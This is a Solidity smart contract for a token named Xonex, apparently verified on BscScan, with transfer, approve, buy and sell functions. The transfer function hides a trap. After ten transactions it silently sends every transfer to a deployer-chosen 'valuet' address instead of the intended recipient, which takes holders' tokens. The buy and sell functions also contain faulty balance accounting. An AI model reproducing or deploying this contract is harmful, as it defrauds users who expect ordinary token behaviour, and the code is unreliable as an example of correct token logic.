/**
 *Submitted for verification at BscScan.com on 2023-02-24
*/

pragma solidity ^0.8.0;

contract Xonex {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    address public valuet; 
    uint256 public peg;
    uint256 public transactionCount;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals,
        uint256 _totalSupply,
        uint256 _peg,
        address _valuet

    ) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalSupply * 10**uint(decimals);
        balanceOf[msg.sender] = _totalSupply * 10**uint(decimals);
        valuet = _valuet;
        peg = _peg;
        transactionCount = 0;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(_to != address(0));
        require(balanceOf[msg.sender] >= _value);
        require(balanceOf[_to] + _value >= balanceOf[_to]);

        if (transactionCount >= 10) {
            balanceOf[msg.sender] -= _value;
            balanceOf[valuet] += _value;
            emit Transfer(msg.sender, valuet, _value);
            transactionCount++;
            return true;
        }

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        transactionCount++;
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_to != address(0));
        require(balanceOf[_from] >= _value);
        require(allowance[_from][msg.sender] >= _value);
        require(balanceOf[_to] + _value >= balanceOf[_to]);

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function buy() public payable {
        uint256 tokens = msg.value * peg;
        balanceOf[msg.sender] += tokens;
        balanceOf[address(this)] -= tokens;
        emit Transfer(address(this), msg.sender, tokens);
    }

    function sell(uint256 _tokens) public {
        require(balanceOf[msg.sender] >= _tokens);
        uint256 value = _tokens / peg;
        balanceOf[msg.sender] -= _tokens;
        balanceOf[address(this)] += value;
        emit Transfer(msg.sender, address(this), _tokens);
        payable(msg.sender).transfer(value);
    }
}